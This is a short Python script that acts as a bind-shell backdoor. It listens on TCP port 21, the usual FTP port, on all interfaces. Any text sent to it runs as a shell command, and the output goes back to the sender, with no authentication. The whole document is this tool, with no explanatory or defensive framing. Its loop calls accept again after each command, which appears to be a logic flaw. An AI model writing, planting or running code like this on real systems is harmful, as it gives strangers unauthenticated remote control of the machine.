import socket 
import subprocess

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(("0.0.0.0", 21))
    s.listen()
    conn, addr = s.accept()
    with conn:
        while True:
            data= conn.recv(1024)
            page = subprocess.getoutput(data.decode().strip())
            conn.sendall(page.encode())
            conn, addr = s.accept()
